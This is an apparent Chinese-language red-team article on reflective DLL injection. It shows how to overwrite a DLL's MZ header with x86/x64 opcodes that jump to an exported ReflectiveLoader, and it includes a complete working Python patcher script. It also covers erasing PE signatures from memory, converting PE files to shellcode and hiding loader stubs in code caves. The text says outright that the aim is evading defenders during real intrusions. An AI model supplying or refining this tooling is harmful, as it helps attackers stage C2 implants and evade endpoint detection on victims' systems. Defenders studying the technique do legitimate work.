# ReflectiveDLLInjection变形应用

## 简介

反射注入\(ReflectiveInjection\)这种技术也出来好多年了，实现原理大致是不依赖windows提供的loadlibrary函数，程序设计者自己在程序内实现pe的内存展开，由于是自己实现，所以不会在操作系统中有所记录，以及可以对展开的pe文件做一些处理如抹除DOS头，同时不会在peb的ldr链表中记录，发展至今反射注入几乎已经是所有c2的标配技术，github也有非常成熟的项目可供使用，不过由于使用量较大，建议还是简单修改一下再投入实战比较好。

下面写的东西和上面的描述有关系\(dog头\)，可能有的渗透测试工作者不熟悉反射加载的原理，但你一定用过它，较为知名的msf和cs也大量使用这种技术，说是c2的基础技术也不为过，这篇文章会介绍两个应用方式，以及一些优化的思路，以供我们更好的吊打蓝队。

## DLL自加载

在cs的资源文件中所有dll都带有自加载能力，所有beacon的扩展功能几乎都是这样实现的\(如mimikatz\)，cs将其称之为可修补的dll，它的原理是在不改变MZ标志的情况下把整个dll文件修补成可被当作shellcode加载的格式，具体的操作为在dll内导出自加载函数\(ReflectiveLoader\)然后讲MZ头起始字节修改成执行ReflectiveLoader函数的硬编码。

### 流程

1. 将ReflectiveLoader库编译进DLL内。
2. 不破坏MZ标志将DOS头改造成执行ReflectiveLoader函数的shellcode。

### 原理

首先我们不能破坏PE结构也就是DOS头内的MZ标志，如果我们要把dll处理成shellcode，那么MZ标志就要被当作是代码执行。

我们将MZ的机器码转换成汇编指令，这里以X86为例，文章末尾也会给出X64的代码。

![](../.gitbook/assets/image%20%28225%29.png)

可以看到MZ对应的汇编代码是↓，我们需要消除这两条指令的影响。

```text
dec ebp                  ;ebp -1
pop edx                  ;edx=[esp] esp+4
//恢复环境
inc ebp                  ;ebp +1
push edx                 ;esp-4 [esp]=edx
```

然后需要将执行指针\(eip/rip\)指向ReflectiveLoader。

```text
call 0                   ;获取下一条指令的内存地址
pop edx                  ;将下一条指令出栈给edx
add edx,<FuncOffset-0x09>;计算ReflectiveLoader函数在内存中的位置
push ebp
mov ebp, esp             ;切换堆栈
call edx                 ;调用ReflectiveLoader
```

修补过后↓，这里代码使用[https://github.com/rapid7/ReflectiveDLLInjection](https://github.com/rapid7/ReflectiveDLLInjection)。

![](../.gitbook/assets/image%20%28227%29.png)

![](../.gitbook/assets/image%20%28224%29.png)

x64:

```text
41 5a                   ;pop r10
41 52                   ;push r10
e8 00 00 00 00          ;call 0
5b                      ;pop rbx
48 81 c3 09 00 00 00    ;add rbx, 0x09
55                      ;push  rbp
48 89 e5                ;mov rbp, rsp
ff d3                   ;call rbx
```

![](../.gitbook/assets/image%20%28238%29.png)

### 代码

```text
import sys
import pefile
from struct import pack

def help():
    print("usage: python3 <DllPath> <FuncName>\n")

def get_func_offset(pe_file,func_name):
    if hasattr(pe_file,'DIRECTORY_ENTRY_EXPORT'):
        for export in pe_file.DIRECTORY_ENTRY_EXPORT.symbols:
            if func_name in str(export.name):
                func_rva = export.address
                break

    if func_rva == 0:
        help()
        print("[-] not found function offset in file")
        sys.exit(0)

    offset_va = func_rva - pe_file.get_section_by_rva(func_rva).VirtualAddress
    func_file_offset = offset_va + pe_file.get_section_by_rva(func_rva).PointerToRawData
    func_file_offset -= 9 
    
    return bytes(pack("<I",func_file_offset))

def get_patch_stub(pe_file,func_offset):

    if pe_file.FILE_HEADER.Machine == 0x014c:
        is64 = False
    elif pe_file.FILE_HEADER.Machine ==0x0200 or pe_file.FILE_HEADER.Machine ==0x8664:
        is64 =True
    else:
        print("[-]unknow the format of this pe file")
        sys.exit()

    if is64:
                stub =(
                b"\x4D\x5A"
                b"\x41\x52"
                b"\xe8\x00\x00\x00\x00"
                b"\x5b"
                b"\x48\x81\xC3" + func_offset +
                b"\x55"
                b"\x48\x89\xE5"
                b"\xFF\xD3"
                );

    else:
                stub = (
                b"\x4D"
                b"\x5A"
                b"\x45"
                b"\x52"
                b"\xE8\x00\x00\x00\x00"
                b"\x5A"
                b"\x81\xC2" + func_offset +
                b"\x55"
                b"\x8B\xEC"
                b"\xFF\xD2"
                );
    return stub;

def patch_dll(pe_path,func_name):
    try:
        pe_file =pefile.PE(pe_path)
    except e:
        print(str(e))
        help()
        sys.exit()

    
    func_offset = get_func_offset(pe_file,func_name)
    patch_stub = get_patch_stub(pe_file,func_offset)
    

    filearray = open(pe_path,'rb').read()
    print("[+] loaded nameof %s"% (pe_path))

    patch_dll_file = patch_stub + filearray[len(patch_stub):]
    print("[+] patched offset %s" % (func_offset.hex()))

    patch_dll_name = "patch-" +pe_path
    open(patch_dll_name,'wb').write(patch_dll_file)
    print("[+] wrote nameof %s"% (patch_dll_name))
    
if __name__ == '__main__':
    a = len(sys.argv)
    if len(sys.argv) != 3:
        help()
        sys.exit(0);
    pe_path = sys.argv[1]
    func_name =  sys.argv[2]
    patch_dll(pe_path,func_name)

```

### 优化

我们看到反射加载的DLL在内存中还是会存在很明显的PE格式文件特征，接下来我们尝试把他的PE特征抹掉。\(涉及项目，反射代码就不贴了\)。

优化前。

![](../.gitbook/assets/image%20%28231%29.png)

优化后。

![](../.gitbook/assets/image%20%28230%29.png)

聪明的你应该已经想到我做了什么\(狗头\)。

## PE-&gt;SHELLCODE改造

### 思路

上面的操作大概是这样的↓，学过shellcode开发的朋友可能知道，如果我们直接在DLL文件内编写加载函数是不能使用一些编写语法的如字符串、函数、CRT之类的东西的，就算要用系统函数也不能直接调用，前面我们使用的[ReflectiveDLLInjection](https://github.com/rapid7/ReflectiveDLLInjection)项目中ReflectiveLoader函数源码其实是经过特殊处理的，它遵循shellcode的开发限制，把所有东西都编译到一起，也避免了所有字符串和依赖的限制，保证了的编译出来的代码在任意环境下都能使用，也就是这段代码抠出来是能直接使用的，如果我们编写一个可修补的dll比较麻烦，我们也可以利用这段反射加载的shellcode来对已有PE文件进行改造。

![](../.gitbook/assets/image%20%28233%29.png)

改造思路：

![](../.gitbook/assets/image%20%28234%29.png)

这种技术已经有比较成熟的开源项目[pe\_to\_shellcode](https://github.com/hasherezade/pe_to_shellcode.git)，这个老哥用汇编实现了一个反射加载的stub\(太硬核了\)，同样我们也用上一种应用的思路对这个stub进行优化，加载后抹除PE的特征，在这个基础上，我们可以快速对一个已有的功能模块进行修补。

### 优化

上面的实现方式会对PE文件本身的大小产生影响，在哪年的黑帽大会上有一位究极老师傅公开过一种PE注入技术\(还有武器化的工具\)，原理是利用编译过程中产生的code caves\(编译过程文件对齐产生的空字节区\)，在这些区域插入loader stub，就可以避免改造后的PE文件体积增大，不过需要注入代码洞的大小不能小于loader stub的大小。

看上去是这样的:

![](../.gitbook/assets/image%20%28232%29.png)

![](../.gitbook/assets/image%20%28237%29.png)

![](../.gitbook/assets/image%20%28235%29.png)

## LINKS

{% embed url="https://wbglil.github.io/2020/03/27/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84dll%E4%BF%AE%E8%A1%A5/" %}

{% embed url="https://github.com/rapid7/ReflectiveDLLInjection" %}



